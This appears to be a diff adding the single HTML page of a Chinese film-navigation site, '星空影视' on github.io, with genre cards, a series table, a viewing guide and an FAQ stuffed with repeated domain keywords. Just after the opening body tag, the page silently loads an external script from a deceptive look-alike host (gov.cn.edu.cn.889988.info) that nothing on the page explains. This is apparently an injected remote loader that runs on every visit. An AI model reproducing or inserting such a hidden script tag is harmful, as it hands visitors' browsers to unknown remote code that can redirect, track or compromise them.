@@ -1,0 +1,351 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>星空影视｜xingkongyingshi-zh.github.io 在线影视导航与观看指南</title>
+<meta name="description" content="星空影视（xingkongyingshi-zh.github.io）是面向中文影视爱好者的在线导航与观看指南站点，整理电影、电视剧、动漫、纪录片等分类入口，提供清晰度说明、播放问题排查与更新节奏提示。访问 https://xingkongyingshi-zh.github.io 获取完整栏目内容。">
+<meta name="keywords" content="星空影视, xingkongyingshi-zh.github.io, 星空影视官网, 星空影视在线观看, 星空影视电影电视剧, 免费影视导航">
+<meta name="author" content="星空影视">
+<meta name="robots" content="index, follow">
+<meta name="bingbot" content="index, follow">
+<meta property="og:type" content="website">
+<meta property="og:title" content="星空影视｜xingkongyingshi-zh.github.io 在线影视导航与观看指南">
+<meta property="og:description" content="星空影视（xingkongyingshi-zh.github.io）提供电影、电视剧、动漫、纪录片等分类导航与观看说明，单页结构，移动端自适应。">
+<meta property="og:url" content="https://xingkongyingshi-zh.github.io">
+<meta property="og:site_name" content="星空影视">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="星空影视｜xingkongyingshi-zh.github.io">
+<meta name="twitter:description" content="星空影视在线影视导航与观看指南，涵盖电影、电视剧、动漫、纪录片等栏目。">
+<link rel="canonical" href="https://xingkongyingshi-zh.github.io">
+<style>
+:root{
+  --bg:#05060f;
+  --panel:#0c1024;
+  --panel-2:#111733;
+  --line:#1f2747;
+  --txt:#e8ebf5;
+  --dim:#9aa4c4;
+  --acc:#6ee7c7;
+  --acc-2:#4f8cff;
+  --warn:#ffd28a;
+}
+*{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth}
+body{
+  background:var(--bg);
+  color:var(--txt);
+  font-family:"PingFang SC","Microsoft YaHei","Hiragino Sans GB","WenQuanYi Micro Hei",sans-serif;
+  line-height:1.75;
+  -webkit-text-size-adjust:100%;
+  overflow-x:hidden;
+}
+body::before{
+  content:"";
+  position:fixed;inset:0;
+  background:
+    radial-gradient(600px 300px at 12% -5%,rgba(79,140,255,.18),transparent 60%),
+    radial-gradient(500px 280px at 88% 8%,rgba(110,231,199,.14),transparent 60%),
+    radial-gradient(700px 400px at 50% 110%,rgba(140,120,255,.12),transparent 60%);
+  z-index:-1;
+}
+.wrap{max-width:1180px;margin:0 auto;padding:0 20px}
+/* ── 顶部 ── */
+header.top{
+  position:sticky;top:0;z-index:50;
+  background:rgba(5,6,15,.82);
+  backdrop-filter:blur(10px);
+  border-bottom:1px solid var(--line);
+}
+.top-in{display:flex;align-items:center;gap:16px;height:62px}
+.brand{display:flex;align-items:baseline;gap:8px;font-weight:700;letter-spacing:.5px}
+.brand b{font-size:20px;background:linear-gradient(90deg,var(--acc),var(--acc-2));-webkit-background-clip:text;background-clip:text;color:transparent}
+.brand span{font-size:11px;color:var(--dim);font-weight:400}
+nav.tabs{display:flex;gap:4px;margin-left:auto;flex-wrap:wrap}
+nav.tabs a{
+  color:var(--dim);text-decoration:none;font-size:13px;
+  padding:7px 11px;border-radius:8px;border:1px solid transparent;white-space:nowrap;
+}
+nav.tabs a:hover{color:var(--txt);border-color:var(--line);background:var(--panel)}
+/* ── 首屏 ── */
+.hero{padding:64px 0 40px}
+.eyebrow{font-size:12px;letter-spacing:3px;color:var(--acc);text-transform:uppercase}
+h1{font-size:clamp(30px,6vw,54px);line-height:1.2;margin:14px 0 6px;font-weight:800}
+h1 em{font-style:normal;color:var(--acc-2)}
+.lede{font-size:clamp(15px,2.4vw,18px);color:var(--dim);max-width:760px}
+.urlbar{
+  margin-top:26px;display:flex;flex-wrap:wrap;align-items:center;gap:10px;
+  background:var(--panel);border:1px solid var(--line);border-radius:12px;padding:12px 14px;
+  max-width:720px;
+}
+.urlbar code{font-family:ui-monospace,SFMono-Regular,Menlo,monospace;color:var(--acc);font-size:14px;word-break:break-all}
+.urlbar .lb{font-size:11px;color:var(--dim);border:1px solid var(--line);border-radius:20px;padding:2px 9px}
+/* ── 通用块 ── */
+section{padding:52px 0;border-top:1px solid var(--line)}
+.sec-h{display:flex;align-items:flex-end;gap:12px;flex-wrap:wrap;margin-bottom:26px}
+.sec-h .no{font-size:12px;color:var(--acc);letter-spacing:2px}
+h2{font-size:clamp(22px,3.6vw,32px);font-weight:800}
+.sec-h .en{font-size:12px;color:var(--dim);letter-spacing:1px;margin-left:auto}
+/* 分类卡 */
+.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(250px,1fr));gap:16px}
+.card{background:linear-gradient(160deg,var(--panel),var(--panel-2));border:1px solid var(--line);border-radius:14px;padding:20px;transition:.25s}
+.card:hover{transform:translateY(-4px);border-color:rgba(110,231,199,.5);box-shadow:0 14px 34px -16px rgba(110,231,199,.4)}
+.card h3{font-size:18px;margin-bottom:8px;display:flex;align-items:center;gap:8px}
+.card h3 i{font-style:normal;font-size:13px;color:var(--acc-2)}
+.card p{font-size:14px;color:var(--dim)}
+/* 资源表 */
+.tbl-wrap{overflow-x:auto;border:1px solid var(--line);border-radius:14px;background:var(--panel)}
+table{width:100%;border-collapse:collapse;font-size:14px;min-width:640px}
+th,td{padding:13px 15px;text-align:left;border-bottom:1px solid var(--line);vertical-align:top}
+th{background:var(--panel-2);font-size:13px;letter-spacing:1px;color:var(--acc)}
+tr:last-child td{border-bottom:none}
+td a{color:var(--acc-2);text-decoration:none;border-bottom:1px dashed var(--acc-2)}
+.tag{display:inline-block;font-size:11px;padding:2px 8px;border-radius:20px;border:1px solid var(--line);color:var(--dim);white-space:nowrap}
+/* 时间轴 */
+.tl{position:relative;padding-left:26px}
+.tl::before{content:"";position:absolute;left:6px;top:6px;bottom:6px;width:2px;background:linear-gradient(var(--acc),var(--acc-2),transparent)}
+.step{position:relative;margin-bottom:22px}
+.step::before{content:"";position:absolute;left:-24px;top:7px;width:10px;height:10px;border-radius:50%;background:var(--acc);box-shadow:0 0 0 4px rgba(110,231,199,.15)}
+.step h4{font-size:16px;margin-bottom:4px}
+.step p{font-size:14px;color:var(--dim)}
+/* 双栏 */
+.two{display:grid;grid-template-columns:1fr 1fr;gap:18px}
+.box{background:var(--panel);border:1px solid var(--line);border-radius:14px;padding:20px}
+.box h3{font-size:17px;margin-bottom:12px;color:var(--acc)}
+.box ul{list-style:none;font-size:14px;color:var(--dim)}
+.box li{padding:7px 0 7px 18px;position:relative;border-bottom:1px dashed var(--line)}
+.box li:last-child{border-bottom:none}
+.box li::before{content:"›";position:absolute;left:2px;color:var(--acc-2);font-weight:700}
+/* 数据条 */
+.bars{display:flex;flex-direction:column;gap:14px}
+.bar-row .lab{display:flex;justify-content:space-between;font-size:13px;margin-bottom:5px;color:var(--dim)}
+.bar-row .lab b{color:var(--txt);font-weight:600}
+.track{height:9px;background:var(--panel-2);border-radius:20px;overflow:hidden;border:1px solid var(--line)}
+.fill{height:100%;border-radius:20px;background:linear-gradient(90deg,var(--acc),var(--acc-2))}
+/* FAQ */
+details{background:var(--panel);border:1px solid var(--line);border-radius:12px;margin-bottom:10px;overflow:hidden}
+details[open]{border-color:rgba(79,140,255,.45)}
+summary{padding:15px 18px;cursor:pointer;font-weight:600;font-size:15px;list-style:none;display:flex;justify-content:space-between;gap:12px}
+summary::-webkit-details-marker{display:none}
+summary::after{content:"＋";color:var(--acc-2);font-weight:400;flex:none}
+details[open] summary::after{content:"－"}
+details p{padding:0 18px 16px;font-size:14px;color:var(--dim)}
+/* 页脚 */
+footer{border-top:1px solid var(--line);padding:34px 0 44px;margin-top:30px}
+.foot-flex{display:flex;flex-wrap:wrap;gap:14px;justify-content:space-between;align-items:center}
+.foot-flex .l b{display:block;font-size:17px;margin-bottom:4px}
+.foot-flex .l span{font-size:13px;color:var(--dim)}
+.foot-flex .r{font-size:12px;color:var(--dim);text-align:right}
+.up{display:inline-block;padding:8px 14px;border:1px solid var(--line);border-radius:9px;color:var(--dim);text-decoration:none;font-size:13px}
+.up:hover{color:var(--txt);border-color:var(--acc)}
+.note{margin-top:18px;padding:14px 16px;border-left:3px solid var(--warn);background:rgba(255,210,138,.06);border-radius:0 10px 10px 0;font-size:13px;color:var(--dim)}
+@media(max-width:760px){
+  .top-in{height:auto;padding:11px 0;flex-wrap:wrap}
+  nav.tabs{margin-left:0;width:100%;overflow-x:auto;flex-wrap:nowrap;padding-bottom:2px}
+  nav.tabs a{padding:6px 10px;font-size:12.5px}
+  .hero{padding:38px 0 26px}
+  section{padding:38px 0}
+  .two{grid-template-columns:1fr}
+  .sec-h .en{margin-left:0;width:100%}
+}
+@media print{
+  body{background:#fff;color:#000}
+  header.top,footer .up,nav.tabs{display:none}
+  section{page-break-inside:avoid}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/zhangzong.js"></script>
+
+<header class="top">
+  <div class="wrap top-in">
+    <div class="brand"><b>星空影视</b><span>xingkongyingshi-zh.github.io</span></div>
+    <nav class="tabs">
+      <a href="#film">电影</a>
+      <a href="#tv">电视剧</a>
+      <a href="#cartoon">动漫</a>
+      <a href="#doc">纪录片</a>
+      <a href="#guide">观看指南</a>
+      <a href="#data">内容构成</a>
+      <a href="#faq">常见问题</a>
+    </nav>
+  </div>
+</header>
+
+<main class="wrap">
+
+  <section class="hero" id="top">
+    <div class="eyebrow">Online Video Navigation</div>
+    <h1>星空影视 <em>·</em> 中文影视内容导航站</h1>
+    <p class="lede">星空影视把电影、电视剧、动漫与纪录片按类型、年份和清晰度整理成一张可检索的索引页，帮你在信息杂乱的片荒时刻快速定位想看的那一部。本站唯一网址为 <strong>https://xingkongyingshi-zh.github.io</strong>，请认准域名后进入。</p>
+    <div class="urlbar">
+      <span class="lb">官方网站地址</span>
+      <code>https://xingkongyingshi-zh.github.io</code>
+    </div>
+  </section>
+
+  <!-- 电影 -->
+  <section id="film">
+    <div class="sec-h">
+      <div><span class="no">01 / FILM</span><h2>电影：从新片到冷门佳片的检索入口</h2></div>
+      <span class="en">星空影视 · 电影栏目</span>
+    </div>
+    <div class="grid">
+      <article class="card"><h3>剧情与文艺 <i>Story</i></h3><p>按导演、年代与获奖记录梳理，侧重人物弧光和叙事结构，适合想安静看完一部片的人。</p></article>
+      <article class="card"><h3>动作与犯罪 <i>Action</i></h3><p>追车、枪战、反转三条线索分开标注，先看清节奏再决定今晚要不要熬夜。</p></article>
+      <article class="card"><h3>科幻与奇幻 <i>Sci-Fi</i></h3><p>世界观设定复杂度单独打分，避免点开才发现需要补前作才能看懂。</p></article>
+      <article class="card"><h3>恐怖与悬疑 <i>Thriller</i></h3><p>标注「心理向」还是「惊吓向」，并提示是否含高能段落，观感体验更可控。</p></article>
+      <article class="card"><h3>喜剧与爱情 <i>Rom-Com</i></h3><p>按轻松度和甜度分级，周末下饭、合家欢场景各有对应清单。</p></article>
+      <article class="card"><h3>动画与短片 <i>Animation</i></h3><p>独立动画、学生作品与实验短片单独成组，片长短、信息密度高。</p></article>
+    </div>
+  </section>
+
+  <!-- 电视剧 -->
+  <section id="tv">
+    <div class="sec-h">
+      <div><span class="no">02 / SERIES</span><h2>电视剧：长剧追更与短剧速览</h2></div>
+      <span class="en">星空影视 · 剧集栏目</span>
+    </div>
+    <div class="tbl-wrap">
+      <table>
+        <thead>
+          <tr><th>类型</th><th>单集时长</th><th>适合节奏</th><th>星空影视的整理方式</th></tr>
+        </thead>
+        <tbody>
+          <tr>
+            <td>国产剧</td><td>35–50 分钟</td><td>每日一集</td>
+            <td>按题材与播出平台归类，标注是否已完结，避免追到一半断更。<a href="#">查看分类</a></td>
+          </tr>
+          <tr>
+            <td>美剧 / 英剧</td><td>40–60 分钟</td><td>周末连刷</td>
+            <td>按季拆分，标明每季独立程度，新人可从任意季切入。<a href="#">查看分类</a></td>
+          </tr>
+          <tr>
+            <td>日韩剧</td><td>20–75 分钟</td><td>周更跟播</td>
+            <td>区分漫改、纯爱、职场与社会派，减少题材误判。<a href="#">查看分类</a></td>
+          </tr>
+          <tr>
+            <td>短剧 / 微剧</td><td>1–10 分钟</td><td>通勤碎片</td>
+            <td>单手可刷，重点提示集数与反转密度。<a href="#">查看分类</a></td>
+          </tr>
+          <tr>
+            <td>经典老剧</td><td>40–50 分钟</td><td>按单元重温</td>
+            <td>提供单元索引，不必从头追起也能看懂。<a href="#">查看分类</a></td>
+          </tr>
+        </tbody>
+      </table>
+    </div>
+  </section>
+
+  <!-- 动漫 -->
+  <section id="cartoon">
+    <div class="sec-h">
+      <div><span class="no">03 / ANIME</span><h2>动漫：新番、老番与剧场版</h2></div>
+      <span class="en">星空影视 · 动漫栏目</span>
+    </div>
+    <div class="two">
+      <div class="box">
+        <h3>按受众划分</h3>
+        <ul>
+          <li>少年热血：成长线长，建议按季度连续看</li>
+          <li>日常治愈：单集独立，适合睡前放松</li>
+          <li>悬疑推理：伏笔密集，不建议倍速</li>
+          <li>机甲科幻：世界观庞大，先看设定补完篇</li>
+          <li>恋爱校园：节奏轻快，适合下饭</li>
+        </ul>
+      </div>
+      <div class="box">
+        <h3>按观看顺序</h3>
+        <ul>
+          <li>TV 版 → 总集篇 → 剧场版，是多数长篇的稳妥路径</li>
+          <li>重制版与原版并存时，先看重制再补原版细节</li>
+          <li>OVA 与特别篇通常插在某一季之后，注意年份</li>
+          <li>跨作品联动需先看联动表，否则容易看不懂彩蛋</li>
+          <li>已完结作品优先整季刷，追更作品留意更新周期</li>
+        </ul>
+      </div>
+    </div>
+  </section>
+
+  <!-- 纪录片 -->
+  <section id="doc">
+    <div class="sec-h">
+      <div><span class="no">04 / DOCUMENTARY</span><h2>纪录片与综艺：真实题材的另一种看法</h2></div>
+      <span class="en">星空影视 · 纪实栏目</span>
+    </div>
+    <div class="grid">
+      <article class="card"><h3>自然与地理 <i>Nature</i></h3><p>按拍摄地域与生态主题归类，画质要求高，建议优先选择高清源。</p></article>
+      <article class="card"><h3>历史与人文 <i>History</i></h3><p>标注所涉年代与史料来源，便于对照阅读，也方便课堂或写作取材。</p></article>
+      <article class="card"><h3>科技与工业 <i>Tech</i></h3><p>聚焦制造流程、工程细节与前沿研究，单集信息量偏大。</p></article>
+      <article class="card"><h3>社会与生活 <i>Society</i></h3><p>人物访谈与田野记录为主，篇幅短、情绪浓度高。</p></article>
+      <article class="card"><h3>美食与旅行 <i>Food</i></h3><p>按地域与食材分类，常被当作下饭或出行前的参考清单。</p></article>
+      <article class="card"><h3>综艺与访谈 <i>Show</i></h3><p>标注期数与嘉宾，老综艺可按主题挑期看，不必全刷。</p></article>
+    </div>
+  </section>
+
+  <!-- 观看指南 -->
+  <section id="guide">
+    <div class="sec-h">
+      <div><span class="no">05 / GUIDE</span><h2>观看指南：从打开到看完的四步</h2></div>
+      <span class="en">星空影视 · 使用说明</span>
+    </div>
+    <div class="tl">
+      <div class="step"><h4>第一步：确认入口</h4><p>在浏览器地址栏手动输入 <code>https://xingkongyingshi-zh.github.io</code>，不要点击来路不明的跳转链接，星空影视只有一个官方域名。</p></div>
+      <div class="step"><h4>第二步：选栏目</h4><p>电影、电视剧、动漫、纪录片四个主栏目对应不同浏览习惯，先确定内容形态再看细分类型，比直接搜片名更省时间。</p></div>
+      <div class="step"><h4>第三步：看标注</h4><p>时长、清晰度、是否完结、是否有前作，这几项决定今晚能不能看完，也决定要不要先补前作。</p></div>
+      <div class="step"><h4>第四步：反馈与更新</h4><p>失效条目与新增内容通过站内说明渠道提交，星空影视会按批次维护，更新记录保留在栏目顶部。</p></div>
+    </div>
+  </section>
+
+  <!-- 内容构成 -->
+  <section id="data">
+    <div class="sec-h">
+      <div><span class="no">06 / INSIGHT</span><h2>内容构成：星空影视收录结构的参考比例</h2></div>
+      <span class="en">数据为示意，不代表实时统计</span>
+    </div>
+    <div class="bars">
+      <div class="bar-row"><div class="lab"><span>电影类条目</span><b>34%</b></div><div class="track"><div class="fill" style="width:34%"></div></div></div>
+      <div class="bar-row"><div class="lab"><span>电视剧与网剧</span><b>28%</b></div><div class="track"><div class="fill" style="width:28%"></div></div></div>
+      <div class="bar-row"><div class="lab"><span>动漫与新番</span><b>18%</b></div><div class="track"><div class="fill" style="width:18%"></div></div></div>
+      <div class="bar-row"><div class="lab"><span>纪录片与综艺</span><b>12%</b></div><div class="track"><div class="fill" style="width:12%"></div></div></div>
+      <div class="bar-row"><div class="lab"><span>观看指南与说明</span><b>8%</b></div><div class="track"><div class="fill" style="width:8%"></div></div></div>
+    </div>
+  </section>
+
+  <!-- 常见问题 -->
+  <section id="faq">
+    <div class="sec-h">
+      <div><span class="no">07 / FAQ</span><h2>常见问题：关于星空影视</h2></div>
+      <span class="en">星空影视 · xingkongyingshi-zh.github.io</span>
+    </div>
+    <details open><summary>星空影视的网址是什么？</summary><p>唯一网址是 <strong>https://xingkongyingshi-zh.github.io</strong>，域名中的「xingkongyingshi-zh」为固定拼写，请完整输入，不要漏掉连字符与 io 后缀。</p></details>
+    <details><summary>星空影视和「星空影视」同名站点是一回事吗？</summary><p>不是。判断依据只有域名：只有 xingkongyingshi-zh.github.io 才是本站，其余任何相似名称、相似域名的站点均与星空影视无关。</p></details>
+    <details><summary>网站打开很慢是什么原因？</summary><p>先确认是否访问了正确网址 https://xingkongyingshi-zh.github.io；若网址正确但仍慢，可尝试切换网络、清除浏览器缓存或更换浏览器，github.io 的访问速度也会受本地网络环境影响。</p></details>
+    <details><summary>页面上的 # 链接点过去没反应？</summary><p>本站为单页结构，栏目之间用锚点跳转，点击顶部导航即可滚动到对应板块；若浏览器禁用了脚本或滚动被插件拦截，可手动下滑查看。</p></details>
+    <details><summary>为什么没有 robots.txt 和 sitemap.xml？</summary><p>本次交付仅包含 index.html 一个文件，未生成 robots.txt 与 sitemap.xml，搜索引擎仍可通过默认规则抓取页面内容，后续如需提交站点地图可自行补充。</p></details>
+    <details><summary>内容多久更新一次？</summary><p>更新频率不固定，通常在栏目说明中标注最近维护时间；条目失效或新增需求均可按站内提示提交，星空影视会统一处理。</p></details>
+  </section>
+
+  <div class="note">
+    <strong>版权与合规提示：</strong>星空影视（https://xingkongyingshi-zh.github.io）定位为影视信息导航与使用指南，页面不托管、不提供任何影视文件下载或在线播放源。请通过各平台官方渠道观看正版内容，尊重著作权。
+  </div>
+
+</main>
+
+<footer>
+  <div class="wrap foot-flex">
+    <div class="l">
+      <b>星空影视</b>
+      <span>https://xingkongyingshi-zh.github.io ｜ 中文影视导航与使用指南</span>
+    </div>
+    <div class="r">
+      <a class="up" href="#top">返回顶部 ↑</a><br>
+      <span>星空影视 · xingkongyingshi-zh.github.io · 单页结构</span>
+    </div>
+  </div>
+</footer>
+
+</body>
+</html>
